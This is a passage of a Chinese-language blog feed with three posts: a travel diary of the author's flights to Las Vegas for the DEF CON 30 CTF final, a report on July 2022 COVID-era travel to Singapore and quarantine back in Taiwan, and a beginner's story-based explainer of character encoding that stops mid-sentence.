        <content type="html"><![CDATA[<p>終於結束了一週多的 DEF CON 之旅，這篇簡單記一下心得，會比較偏向紀錄整個旅程而非 DEF CON 本身，簡單來說就是遊記啦。</p><p>開始之前先跟不知道什麼是 DEF CON 的人介紹一下。</p><p>DEF CON 簡單來說就是一個資安相關的研討會，而其中有一個活動叫做 CTF，把它想成一個比賽就行了，每一年都會先有資格賽，資格賽打贏之後才能去參加決賽，每個隊伍都會有一台機器，主辦單位會在上面放一些有漏洞的服務，你要修補自己的，同時也要攻擊其他人的服務去拿分，分數多的就贏了。</p><p>今年的 DEF CON 辦在拉斯維加斯，因為要飛去美國參賽（不去現場也可以，也能線上參賽，但一定要有人到場去佈置網路之類的設備開放給遠端去連線）。</p><p>這次去美國因為我想搭日航（或至少是寰宇一家）累積我的哩程，所以沒有選擇應該是最快的台北直飛舊金山再轉機 LAS（聯合航空），而是選擇了相對繞的：</p><ol><li>（CI 華航執飛）TSA -&gt; HND（羽田）</li><li>（JL 日航）HND -&gt; LAX（洛杉磯）</li><li>（AA 美航）LAX -&gt; LAS（拉斯維加斯）</li></ol><p>需要轉機兩次才會到達目的地。</p><p>從松山機場出發時是早上，因為也沒什麼班機，整個機場空蕩蕩的：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1____vVM____M5vYMI3tGXP__kT1g.jpeg"></p><p>因為我有 JL（日本航空）的高卡會員（詳情可參考<a href="/2019/06/01/jgc-and-jal-ctystal-862f2bb4af8b/">《非典型微 JGC 修行（JMB 水晶卡）之旅》</a>），所以可以進貴賓室，目前松山機場只有唯一一間貴賓室，而且很空：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__CzTj__la6nq2RjaWTct3hRw.jpeg"></p><p>當時是早上飛的，目前因為疫情所以都是點餐式的，拿到的早餐長這樣：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__nvw9hVLxFvPfHjzuZU0J1Q.jpeg"></p><p>味道的話就普普通通，魚跟那個鹹蛋有點太鹹了導致最後沒吃完，接著在貴賓室再休息一下以後就跑去登機了，整台班機大概只有 50 個人左右，不過商務艙似乎是全滿，看起來是從日本來臺灣出差的上班族之類的。</p><p>到了日本以後，會分批下機，要入境的先下，轉機的後下，會有地勤把要轉機的人都集合起來以後一起帶著走，重新過一次安檢，檢查一下隨身行李，過安檢以後就回到管制區了。</p><p>在管制區隨意晃晃以後，就去了機場的日航貴賓室，因為等級不夠高沒辦法去頭等貴賓室，只能去商務貴賓室（Sakura Lounge），是個很舒服的地方，很大然後人又不會太多：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__u3yMbUZ__FqniBuDY__y4oAQ.jpeg"></p><p>餐點的部份一樣是用點餐的，選擇滿多的，包括：</p><ol><li>招牌咖哩飯（可以選大份或小份）</li><li>牛丼</li><li>義大利麵</li><li>日式傳統定食</li><li>麵包</li><li>沙拉</li><li>鯛魚燒</li><li>杏仁豆腐</li><li>味噌湯</li></ol><p>點了招牌咖哩飯，有點偏鹹：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__FE27BfiPcYxqHs7N__fPHiQ.jpeg"></p><p>然後有個插曲是前一天我在查位子時，到日航網站出現了「非自願調整艙等」的字樣，上網查了一下是說似乎就代表升等的意思。我在松山機場的時候其實就拿到了三段的登機證，看了一下飛美國那段，座位從 10A 被改到 4A，確實怎麼看都是商務。</p><p>登機的時候也再次確認了一下，還真的被升等到商務了！我愛日航，日航我大哥，以後去日本只搭日航！</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__jBm8IyRuqHYmOadVYBlYDg.jpeg"><br><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__dN0h4p51L6At2ysmIGs86w.jpeg"></p><p>跟以前搭過的商務艙比起來差不多，不過機上的娛樂設備似乎有點偏舊就是了，不過無所謂，對我來說商務艙吃的才是重點，以前我在飛機上都點西式的，但是聽說日航的招牌是日式餐點，於是這次直接點日式的。</p><p>底下放一些機上的餐點：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__3Mt360tLKPmCahEQdz__8mw.jpeg"><br><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__vrpB8NucX0tD5UCbLnE74g.jpeg"><br><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__qMMfK9bsXbmjvpmsOKUJBw.jpeg"></p><p>總共是 10 個多小時的旅程，上機後沒多久就吃第一餐，因為有前菜、主菜還有甜點之類的，所以其實也吃得滿久，邊吃邊看「媽的多重宇宙」，看到後面覺得沒什麼興趣有點亂，就沒看完了。</p><p>接著為了慶祝自己升艙，買了機上的 24hr wifi 支持一下，花了大概台幣 600，在飛機上滑手機。滑著滑著累了稍微睡一下，商務艙的好處就是可以躺平睡覺，比經濟艙舒服很多，不過因為沒什麼睡意，大概就睡了兩小時左右而已。</p><p>起來以後看了另一部電影脫稿玩家，想看這部很久了，飛機上剛好有，真滴好看！看完之後也差不多到美國了。</p><p>因為聽說美國很多人入境，會排很久，所以我轉機時間預留的很長，早上 11 點到洛杉磯，下午 5 點半才飛拉斯維加斯。因為有商務艙優勢，所以基本上是同班機的人前幾個下飛機的，一下飛機就直衝入境，雖然確實有人潮，但沒有想像中的多，大概排了 30~40 分鐘左右就成功入境了。</p><p>入境的時候基本上就問說：</p><ol><li>你從哪裡來？</li><li>你要去哪裡？</li><li>來這邊幹嘛？</li><li>你在台灣是做什麼的？</li></ol><p>很順利，大概聊個兩三分鐘就過關了，什麼文件都沒看。</p><p>到了洛杉磯以後，就開始找尋機場的貴賓室，最先去的是 Terminal B 的 OneWorld 貴賓室，在進去貴賓室的時候對方看到我登機證先是傻了一下，誠如我開頭所說，我在松山機場的時候就把三段登機證都印出來了，但因為是華航印的，所以底都是華航的底，細看班號才會看到是 JL 或是 AA。</p><p>而對方似乎看到那個底就以為我是搭華航班機，就不給進，後來我解釋了一下外加出示實體的日航藍寶石卡，就進去了。</p><p>結果貴賓室裡面超級多人，然後餐點是自助式的，那邊目前對於口罩應該就是可戴可不戴，不戴的居多：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__etjr62__WnX32rPGHsbpP1w.jpeg"></p><p>在這邊待一下之後上網查了其他貴賓室，發現洛杉磯其他航廈有 AA 自營的貴賓室，想說反正時間還很多，就去看一下。</p><p>這邊補一個插曲，我到美國之後打開我的中華電信漫遊，事先買了 20GB 的方案，結果 T-Mobile 的網路慢到傻眼，根本跟不能用一樣。我後來查了一下似乎是頻段的問題？我的 Nokia 5.3 沒有支援 T-Mobile 的 4G 頻段所以才這麼慢之類的。</p><p>洛杉磯機場的國際航廈是 B，B 管制區裡面有走道可以直接到 4 航廈，4 可以到 5，5 可以到 67，其他 123 好像跟這邊是分開的。除了 B 航廈以外，其他航廈都是美國國內線，所以相比之下都滿小的。</p><p>我後來是先去 4 航廈的 AA 貴賓室，也是滿大的，而且食物品質好很多，人也沒這麼多：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__kpP3FQ0Z2ALAb__3YsWQ__Sw.jpeg"></p><p>在這邊待了一個多小時之後繼續探險，把航廈都走過一遍，然後去 5 航廈的 AA 貴賓室看一下，人也滿少的，但食物不怎麼樣。</p><p>結論：4 航廈樂勝。</p><p>就這樣繞著繞著也到了登機時間，就跑去登機了。上飛機以後機長廣播說因為副機師的上個班機有一些問題，所以需要找一個替代的，會花一些時間。</p><p>結果在飛機上等了一小時以後又說什麼天氣問題之類的，所以會繼續再 delay，總之在飛機上等了大概兩個多小時才正式起飛，飛一小時就到了，但加起來花了三小時QQ</p><p>到拉斯維加斯以後果真名不虛傳，機場就可以直接開賭：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__ECYWuAxTyEgIaO__podto9w.jpeg"></p><p>在等行李的時候也發現機場很多廣告都是資安相關的公司，很會抓時間。</p><p>拿到行李之後就直接搭 Uber 去飯店，我還一度擔心沒有網路找不到司機，幸好等 Uber 的地方有免費 Wifi 可以用，這個真的很重要。在車上跟司機尬聊了一下，我搭 Uber 的尬聊起手式是「你開這個是正職嗎還是兼職」以及「當地比較多人用 Uber 還是 Lyft」，這兩個話題可以撐一陣子。</p><p>到飯店之後用自動機器 check-in，發現還滿方便的，資料打一打之後就拿到房卡了，到了房間一度以為自己走錯，因為客廳長這個樣子：</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__dI1NZOMKx9nVNonLJg__rug.jpeg"></p><p>整個房間更像是一個套房那樣，這間是邊間，所以外面的景色也特別好。總而言之，似乎又是個升等。</p><p>後來晚上跟其他隊友（網友）們碰面，出去外面買個東西以後，結束了在美國的第一天。</p><p>我到美國的時候是禮拜三，比賽是禮拜五開始，有兩天的時間可以休息外加調整時差。</p><p>禮拜四的話就是跟其他隊友出去晃晃，參觀各個拉斯維加斯的飯店。因為我以前員工旅遊去過澳門，所以有種既視感，畢竟澳門應該就是學拉斯維加斯的，只是規模沒這麼大。</p><p>在這邊可以看到各種神奇建築，什麼雲霄飛車啦，火山爆發啦，超大水舞啦，假的凱旋門跟巴黎鐵塔啦，應有盡有。</p><p>最後以一張照片做完第一篇的總結。</p><p><img src="/img/def-con-30-ctf-final-1-79220bba7f02/1__SK2__EH9DeuD73FfM7A5GGw.jpeg"></p><p>第二篇傳送門：[&#x2F;2022&#x2F;08&#x2F;16&#x2F;def-con-30-ctf-final-2-4444cf3645e&#x2F;)</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 年 7 月出國旅遊心得（星宇航空 TPE-SIN）</title>
      <link href="/2022/07/24/2022-07-tpe-sin-travel-92e5363560c1/"/>
      <url>/2022/07/24/2022-07-tpe-sin-travel-92e5363560c1/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/2022-07-tpe-sin-travel-92e5363560c1/1__4nFBJBII__xVCvoWjs0YvUQ.jpeg"></p><p>上週去了一趟新加坡，起因是有些假要在時限內請完，外加我一直很想去星宇航空貴賓室看看（我太天真了，之後詳述），再加上以旅遊限制來說，新加坡應該是亞洲數一數二寬鬆的國家，所以就選擇這裡了。</p><p>雖然說有些國家的政策已經放寬許多，台灣也已經漸漸放寬限制，但不少人應該對於出國旅遊還在觀望的階段，因此這篇簡單記錄一下 2022 年 7 月出國的一些心得跟流程，供有興趣出國旅遊的朋友們參考。</p><h3 id="行前準備"><a href="#行前準備" class="headerlink" title="行前準備"></a>行前準備</h3><p>以現在這個時間點來說，出國旅遊就兩個地方最麻煩：</p><ol><li>要去的國家的入境限制</li><li>回台灣以後的隔離</li></ol><p>而開頭已經有提到了，新加坡是目前亞洲裡面旅遊限制很寬鬆的國家，以一個打過三劑國際疫苗（AZ + Moderna）的台灣人來說：</p><ol><li>入境前不需要做 PCR</li><li>入境前不需要申請簽證</li><li>入境後不需要隔離</li><li>入境後不需要做 PCR</li></ol><p>基本上就跟疫情前沒兩樣了，唯一的差別只有：</p><ol><li>入境時要攜帶疫苗施打證明</li><li>入境前要先填好<a href="https://eservices.ica.gov.sg/sgarrivalcard/">電子入境卡</a></li></ol><p>第一點的話最保險的方式似乎是去申請俗稱黃皮書的國際預防接種證明書，但查了一下發現申請滿麻煩的，要跑一趟醫院才能拿到。</p><p>另一種方式是申請「數位新冠病毒健康證明」，這個網路上申請就好了，而新加坡的話也可以在線上先上傳數位健康證明，還滿方便的，於是我只申請了這個而已，沒有申請黃皮書。</p><p>第二點電子入境卡就沒什麼了，一樣是先把數位新冠病毒健康證明準備好就好了。</p><p>就這樣，沒了，要入境新加坡的行前準備就是這麼簡單。</p><h3 id="台灣出境"><a href="#台灣出境" class="headerlink" title="台灣出境"></a>台灣出境</h3><p>在台灣出境的流程其實也跟之前沒兩樣，差別大概只有在 check-in 時地勤會要求看一下你的疫苗施打證明之類的，其他流程都一樣。</p><p>另外，不知道是因為疫情影響還是我的班機太早（到機場時約早上八點），基本上機場的店都沒有開。</p><p>然後我本來以為星宇航空的貴賓室已經恢復營運了，出國前一天上網查才發現原來還沒，於是原本的希望落空，只能去有合作的貴賓室。只好等貴賓室恢復營運再出國一次了。</p><p>然後如果要特殊選位的話（例如說要坐緊急出口或是比較寬的位子）是要加錢的，就算是 Explorer（第二高的等級）也一樣，Insighter（最高的等級）我就不確定了。</p><p>我記得其他航空，例如說之前搭過的日航，有藍寶石的話（一樣是第二高的）這些特殊選位都是有對高卡會員免費開放的？不過我也沒有很確定就是了。</p><h3 id="飛機上"><a href="#飛機上" class="headerlink" title="飛機上"></a>飛機上</h3><p>這次搭的是星宇航空的 A321neo，是比較小的飛機，商務艙只有 8 個座位，經濟艙則是採 3–3 的配置，去程的時候整台飛機大概七八分滿，基本上不會跟陌生人坐到同一排。</p><p>其他令我印象深刻的是每個座位的螢幕上都有寫座位號碼，可以很方便再次確認是否坐錯（以前沒看過類似的設計，可能我飛機搭太少？）。</p><p>缺點的話也很明顯，提供的電影跟戲劇都太少了，電影大概只有 10 部左右，其中大概三四部還是比較偏向給小朋友看的動畫，其他電影有些因為是熱門大片，所以看過的人一定也不少，我記得的有：</p><ol><li>神力女超人 1984</li><li>當男人戀愛時</li><li>玩命關頭某一集（太多集了忘記哪一個）</li><li>花漾女子</li><li>Lady bird</li><li>午夜巴黎</li></ol><p>戲劇跟娛樂節目的話也很少，大概也是六七個選擇而已，唯一有印象的只有茶金前三集跟聲林之王 3。</p><p>然後機上的 wifi 如果你只是要收發訊息的話，是免費的，有實測過 Line 跟 Discord 都可以收發訊息。</p><p>飛機餐的話一個是胡同燒肉丼飯（就是在便利商店可以吃到的那個）：</p><p><img src="/img/2022-07-tpe-sin-travel-92e5363560c1/1__gfTRkv6jb9HA94QuGZU24A.jpeg"></p><p>另外一個是鮮蝦叻沙麵之類的：</p><p><img src="/img/2022-07-tpe-sin-travel-92e5363560c1/1__A__mjHndKmMRNdLGbDLfSrw.jpeg"></p><p>燒肉明顯比較好吃，不過有點油就是了。吃完以後還有冰淇淋當甜點，滿好吃的，口味是紅烏龍焦糖脆脆，是跟蜷尾家合作的甜點，還有這杯叫做湛藍宇宙的調酒也很不錯：</p><p><img src="/img/2022-07-tpe-sin-travel-92e5363560c1/1__xBmGhlu__MhCdVgwVvjezhA.jpeg"></p><h3 id="新加坡入境"><a href="#新加坡入境" class="headerlink" title="新加坡入境"></a>新加坡入境</h3><p>下飛機以後就等排隊入境，意外的人滿多的，大概有十個櫃檯，然後每一個都排了大概十五個人左右。</p><p>大概排了 40 分鐘左右，然後排在前面的人被掃了護照之後就往旁邊被帶開，合理懷疑是沒有填電子入境卡，所以要補填。</p><p>入境的時候海關也沒問什麼問題，也沒看任何資料，就只是照個相按個指紋就成功入境了，入境完以後拿行李也沒什麼問題。</p><p>總之，新加坡入境流程基本上跟疫情前差不多。</p><h3 id="回台灣以前"><a href="#回台灣以前" class="headerlink" title="回台灣以前"></a>回台灣以前</h3><p>在回來以前的 48 小時內要先填這個<a href="https://hdhq.mohw.gov.tw/Default1?openExternalBrowser=1">入境檢疫系統表單</a>：</p><p><img src="/img/2022-07-tpe-sin-travel-92e5363560c1/1__qvJCD7qqV__zemu8fs1IOyg.png"></p><p>當然，如果要住防疫旅館的話要先訂好，但我是自己家隔離所以就沒差。系統裡面會要你填一些基本資料、航班資料還有隔離的地點之類的。</p><p>這個表單滿重要的，之後入境台灣會用到。</p><h3 id="新加坡出境"><a href="#新加坡出境" class="headerlink" title="新加坡出境"></a>新加坡出境</h3><p>出境的時候基本上是採自動出境，掃描護照，做完人臉跟指紋辨識以後就可以進到管制區裡面了。如果自動出境弄不好，旁邊也有人工的可以走，人還滿少的。</p><p>然後這邊順便推薦一下開頭那張圖的地點：星耀樟宜，就在一航廈旁邊而已，又大又漂亮然後又很好逛，喜歡寶可夢的有目前海外唯一的 Pokemon Center，想去超市買伴手禮的也有 FairPrice 可以逛，也有很多臺灣人喜歡買的小 CK，餓了的話也可以吃 Shake Shack 或是在地的松發肉骨茶。</p><p>總之呢，出境也沒什麼問題，跟疫情前都差不多。</p><p>這邊先幫新加坡做個總結，除了入境前要先填好電子入境卡以及準備好疫苗證明以外，其他流程似乎都跟疫情前差不多了。</p><p>而新加坡當地對於口罩的規範則是戶外不強制，室內則還是要戴。</p><p>在那邊待了四天三夜以後，我覺得跟我以前在新加坡的時候沒差多少，在搭車的時候問了當地人，也說恢復得跟疫情前差不多了。</p><h3 id="台灣入境"><a href="#台灣入境" class="headerlink" title="台灣入境"></a>台灣入境</h3><p>飛機抵達台灣以後，如果你之前在檢疫系統填的資料沒有錯誤，照理來說你會收到一個簡訊，裡面有一個網址，點開之後會是申報憑證，上面有個條碼。</p><p>下飛機以後會先到一個地方檢查一下你有沒有這個憑證，沒有的話應該也是可以現場處理。檢查過了以後就繼續排隊到下一關，下一關會掃你的條碼，然後給你三個東西：</p><ol><li>快篩兩個</li><li>唾液 PCR 檢體罐子</li><li>小袋子拿來裝罐子</li></ol><p>接著會快速過一下隨身行李，主要是檢查你有沒有帶肉製品或是水果之類的東西回來，過了以後就去等托運行李了。</p><p>托運行李似乎每一件都會消毒，所以要多等大概 40 分鍾才會開始送上來，而且行李看起來噴滿了酒精，所以上面都是濕的。如果你的行李箱不防水的話，建議自己套一層套子比較好。</p><p>拿完行李以後就正式入境台灣，然後開始排唾液 PCR，我入境那天剛好碰到兩團大團的外籍移工團（應該至少五六十人以上），所以不確定以下的狀況是剛好還是常態。</p><p>唾液 PCR 的部分從排隊到做完應該是半小時左右，做 PCR 的地方在室外，大概有十幾個簡單隔起來的棚子，像是投票所那樣（只是沒有簾子），要在檢體罐裡面吐大概 5cc 左右的口水來做 PCR。</p><p>把檢體罐放進袋子交給在場工作人員以後，就可以回家了。</p><p>（補充一下，我一直以為唾液篩檢跟 PCR 是兩回事，以為還要戳鼻子，後來才發現現在回台的 PCR 就是用唾液來 PCR，不需要像快篩一樣戳鼻子）</p><p>關於回家或是去防疫旅館，這邊有幾個選擇：</p><ol><li>親友接送</li><li>防疫計程車</li><li>防疫租賃車</li></ol><p>二跟三我也不確定差別在哪，3 似乎是比較長途就一定要（例如說要去中南部），短程的我不確定能不能搭。</p><p>我入境那天的防疫計程車直接排爆：</p><p><img src="/img/2022-07-tpe-sin-travel-92e5363560c1/1__YB4XIoGYtcilbboEdBfUPA.jpeg"></p><p>這只是機場內而已，出去之後還要再排。</p><p>我那天晚上的飛機是晚上 7:46 抵達機場，前面那些排隊、等行李跟 PCR 都做完，詳細時間我不太確定，但應該是晚上 9 點左右（因為光行李就要等 40 分鐘以上）。</p><p>最後搭上防疫計程車的時候是晚上 10:18 分，所以光是排隊就排了大概 80 分鐘，隊伍真的長到很崩潰。</p><p>但再次聲明，這有可能是剛好碰到其他大團的特殊狀況，聽說平常好像根本不用排這麼久。不過，如果防疫租賃車可以事先預約的話，我下次應該會先選可以預約的。</p><p>防疫計程車的車資雖然說是跳錶，但最高只會收 1000 塊，從桃園機場搭到中和大概跳到 1450 左右。</p><p>到家之後，就開始隔離的生活。</p><h3 id="居家檢疫-3-天-自主防疫-4-天"><a href="#居家檢疫-3-天-自主防疫-4-天" class="headerlink" title="居家檢疫 3 天 + 自主防疫 4 天"></a>居家檢疫 3 天 + 自主防疫 4 天</h3><p>飛機抵達台灣那天算是第 0 天，接著要進行 3 天的居家檢疫，簡單來說就是不能出門。</p><p>第一天的時候有區公所還是衛生所的人員打電話來關心狀況，然後問需不需要關懷包（裡面就是口罩、垃圾袋跟一些資訊），二三天的時候則換成里幹事打過來關心，然後手機也會收到指揮中心寄來的簡訊，要你回報身體狀況（正常請回 1，有各種症狀請回 2 之類的）。</p><p>雖然說有不少人覺得改成 3+4 沒什麼差，但我實測過後覺得還是差滿多的（至少對於不住防疫旅館的人來說），因為後 4 天如果有快篩陰性的話，基本上是可以出門的，例如說家裡糧食如果沒了可以出門採買之類的，看規定是寫說如果要上班的話也是可以，保持社交距離即可。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>在現在這個時間點出國，比起前幾個月已經方便了許多。</p><p>在入境台灣的部分，已經不需要兩天內的 PCR 陰性證明，也不需要戳鼻子的 PCR，而是改用唾液的方式，隔離也從 7+7 改成了 3+4，未來應該還會再逐漸放寬。</p><p>而出國的部分則是要看各國的規定了，例如說日本還沒開放，韓國要申請簽證而且入境後要 PCR，泰國的話規定似乎也慢慢跟新加坡差不多寬鬆，但還是要申請簽證（原本就要，跟疫情無關）。以亞洲來說的話，應該新加坡是最寬鬆的了，馬來西亞似乎也差不多但我不確定。</p><p>沒意外的話八月我會去一趟 Las Vegas，那時候再來寫一下美國出入境相關的流程（據說入境排隊會排爆 QQ）。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為什麼打開檔案時會看到亂碼？跟著小明一起從傳紙條學習編碼</title>
      <link href="/2022/05/21/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/"/>
      <url>/2022/05/21/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/0__vBV7zz1rjHQQOz6U.jpg"></p><p>一定許多人都有過這種經驗。</p><p>收到朋友傳來的檔案，點開來以後卻顯示一堆看不懂的文字，這就是俗稱的「亂碼」。從亂碼這個問題當作出發點，這篇我想帶大家以比較白話的方式去看為什麼會產生這個問題，以及這個問題該如何解決，目的是想讓沒什麼技術背景的人，也能理解「編碼」到底是什麼，以及一些重要的細節。</p><p>我們就從一個小故事開始吧，主角是好久沒出現的小明，地點是學校，時間是 2000 年，一個智慧型手機還沒流行的年代。</p><h3 id="上課無聊不用功，想盡辦法來溝通"><a href="#上課無聊不用功，想盡辦法來溝通" class="headerlink" title="上課無聊不用功，想盡辦法來溝通"></a>上課無聊不用功，想盡辦法來溝通</h3><p>小明是一位國中二年級的學生，沒錯，就是俗稱的中二。</p><p>他在上課的時候總是不專心，聽不進去老師在講什麼，也不想聽進去。感到無聊的他，想要透過跟同學聊天來打發時間。可是這是在上課，又能跟誰聊天呢？</p><p>在那個傳簡訊一封要三塊的年代，傳紙條顯然是個更超值且合理的選擇。</p><p>班上有另外一位叫做小美的同學，爸爸是美國人，媽媽是台灣人，從小在美國長大，小四以後才回來台灣唸書，因此英文比中文還好。</p><p>小美就坐在小明的旁邊，也是小明的麻吉，因此傳紙條的首選顯然就是小美了。</p><p>可是，在紙條上面用文字聊天並不是個好方法，因為被老師抓到的話就直接掰掰了，小則口頭警告，大則記警告，小明不想因為傳紙條這種事情而被通知家長。</p><p>幸運的是，數學老師跟其他老師不同。就算被抓到在傳紙條，只要紙條上面寫的是「<strong>一連串的數字</strong>」，數學老師就會覺得你在認真學數學，所以不會管你。雖然數學老師時常請假，但在這點上還是挺有原則的。</p><p>於是，聰明的小明想到了跟你一樣的事情：</p><blockquote><p>「那我把傳紙條的內容改成數字不就好了嗎？」</p></blockquote><h3 id="紙條上頭寫滿字，內容必須是數字"><a href="#紙條上頭寫滿字，內容必須是數字" class="headerlink" title="紙條上頭寫滿字，內容必須是數字"></a>紙條上頭寫滿字，內容必須是數字</h3><p>要怎麼把原本想溝通的內容從文字轉成數字呢？</p><p>有一個直覺、暴力但是好用的方法，那就是把每一個英文字母（他跟小美都用英文溝通為主，這樣對小美來說比較快）都換成一個數字。</p><p>於是，小明做出了以下的表格：</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__RqGWIWn00SlT6oxlHdXZ__A.png"></p><p>他把數字+英文字母+一些符號都對應到了一個數字，並且把這個表格在下課時拿給了小美，要他背起來，背起來以後看見數字就可以知道文字是多少。</p><p>例如說小明想傳「hi」，就寫成「1718」，小美看到之後就知道這是 hi，想傳更複雜的「good job!」，就是「162424133619241138」，透過這張文字數字轉換表，就可以在符合數學老師的規則底下順利溝通，光明正大在上課的時候傳紙條聊天。</p><p>看著小明跟小美在上課的時候聊得這麼開心，英文不好的阿猛很不是滋味。</p><h3 id="英文不好不用跑，從頭再造一張表"><a href="#英文不好不用跑，從頭再造一張表" class="headerlink" title="英文不好不用跑，從頭再造一張表"></a>英文不好不用跑，從頭再造一張表</h3><p>阿猛也想在上課的時候光明正大傳紙條，但是他沒辦法沿用小明的這張表格，因為他英文超爛。</p><p>於是，效仿著小明的方法，阿猛拿起了國文課團購的字典，想到了一個妙招，那就是用字典的頁數加上「出現在這頁的第幾個字」，一樣也可以達到原本表格「一個文字對到一個數字」的效果。</p><p>例如說 31，就代表第三頁的第一個字，52 就代表第五頁出現的第二個字，但問題來了，那 111 怎麼辦？這到底是代表第一頁的第十一個字，還是第十一頁的第一個字？</p><p>為了解決這個問題，阿猛制定了一個規範，因為這本字典最多只有到 2100 頁，而每一頁最多只會有 40 個字，所以格式應該要是 xxxxyy，xxxx 代表頁數，沒有四位就補零，yy 代表第幾個字。</p><p>所以第 1頁的第 3 個字，就會是 000103，第 1223 頁的第 17 個字，就是 122317。</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__6XnbivHcGUzkTLRucx4TOg.png"></p><p>透過這樣的編碼方式，阿猛成功地把常見的文字都編碼成數字，並且利用這套方式跟其他同學溝通。一瞬間，整個班上都流行起這樣的方法，上課時紙條飛來飛去，而數學老師則是很開心地點點頭，稱讚大家真是用功向學。</p><p>直到，這一切的平靜被一張誤會的紙條給打破。</p><h3 id="紙條傳錯起爭議，整合表格勢必行"><a href="#紙條傳錯起爭議，整合表格勢必行" class="headerlink" title="紙條傳錯起爭議，整合表格勢必行"></a>紙條傳錯起爭議，整合表格勢必行</h3><p>有天，小明收到一張紙條，上面寫著的是「153012203037」，根據他一開始做的英文轉換表，得到的結果是：「fucku!」，小明嚇到了，想說他又沒有跟其他同學結仇，為什麼要特別傳一張紙條來罵他？</p><p>看到他驚訝的表情，傳紙條給他的同學在下課後來找他澄清：</p><blockquote><p>欸不是啦，我是寫中文啦，那是「打咖」的意思</p></blockquote><p>153012 是「打」，203037 是「咖」，在中文字典上面確實是這樣沒錯。</p><p>同時間，也有其他同學碰到類似的狀況，怎麼收到的紙條解讀完以後是「jefjsq」，這是完全看不懂的亂碼啊！下課後才發現應該是要用中文來解讀那些數字，而不是用英文。</p><p>小明意識到了問題的嚴重性，那就是現在有兩套編碼系統同時在使用，而這兩套系統會產生混淆。如果你用中文系統去解讀英文的數字，或是相反過來，都只會解讀出無意義的東西（或是像小明那樣很衰的剛好是完全不同的意思）。</p><p>於是小明有了一個想法：「我們把中英文都整合在同一張表格吧！把所有的文字都整合在一張表格，就不會混淆了！」</p><p>整合後的表格就跟之前類似，只是稍微調整了一下。</p><p>小明把 0000 這前四碼作為「英文編碼」的意思，就可以快速整合兩種編碼系統。舉例來說，原本英文的 a 是 10，在新系統裡面就變成 000010，而原本的中文因為本來就不會用到 0000 這個頁面，所以可以保留跟之前一樣的規則。</p><p>如此一來，幾乎每一個六位數的數字都有對應的文字，而每一個文字也都有一個對應的數字，大家只要看到前四碼是 0，就會知道這是英文，反之則是中文。</p><p>從此以後大家就過著開心快樂的生活，傳紙條傳得不亦樂乎…嗎？</p><p>還沒有，還差一點。</p><h3 id="紙張太小塞不下，調整編碼加容量"><a href="#紙張太小塞不下，調整編碼加容量" class="headerlink" title="紙張太小塞不下，調整編碼加容量"></a>紙張太小塞不下，調整編碼加容量</h3><p>調整成新的編碼方式以後，有許多平常都只用英文來溝通的同學們集體抱怨，本來只要兩個數字就能搞定的東西，怎麼突然變成六個了？</p><p>紙條小小一張，原本我可以寫 30 個英文字母的，現在只能寫 10 個字母，這樣太浪費空間了吧！</p><p>於是，小明被迫思考新的編碼方式，他左思右想，終於想到了一個好方法。</p><p>那就是，編碼不再以六個字母為一個單位，而是以三個字母為一個單位。</p><p>規則是這樣的，如果是英文字的話，就在第一位加上 0，例如說 a 本來是 10，現在要寫成 010，z 本來是 35，現在要寫成 035。</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__VndJg86J0Qfo3vonFxzeMA.png"></p><p>那中文呢？中文的話比較複雜一點。</p><p>因為現在一組編碼只有三個數字，如果我們的字典最多只到 99 頁的話，事情就好辦了，只要編成 1yy 9zz 就好，yy 代表頁數，zz 代表第幾個字。</p><p>例如說看到 138 913，就知道是「第 38 頁第 13 個字」。</p><p>但問題是這樣的方式沒辦法表示「第 1527 頁的第 13 個字」，因為 yy只有兩位，只能表達兩位數字。</p><p>因此，要表示 100 頁以上的資料，必須再多引入一組數字，像這樣：</p><p>2yy 3yy 9zz，yy 一樣代表的是頁數，zz 代表第幾個字，「第 1527 頁的第 13 個字」就會是 215 327 913。</p><p><img src="/img/what-is-encoding-ascii-unicode-utf8-5fe55a98bee0/1__tfuP9X0PW8EAOwV68odGGA.png"></p><p>換句話說呢，小明把三個數字中的第一個數字，當作是一個「指示」，根據它是 0, 1, 2, 3, 9 的哪一種，就可以知道應該要用什麼樣的規則去解析它。</p><p>在這種編碼系統當中，最後編碼出來的東西長度是會變化的。</p><p>有些字只需要一組數字，例如說英文。有些字需要兩組數字，例如說出現在 1-99 頁的中文，而有些字需要三組數字，像是 100 頁以上的中文字。</p><p>這樣的好處是什麼？</p><p>最大的好處就是它節省了空間。在我們之前的版本中，無論是中文還是英文，每一個字就是需要 6 個數字。而在這個新的版本中，英文只需要 3 個，減少了一半的空間，而對 100 頁以上的中文來說則需要 9 個數字，雖然是原本的 1.5 倍，但其實常用的中文都出現在 100 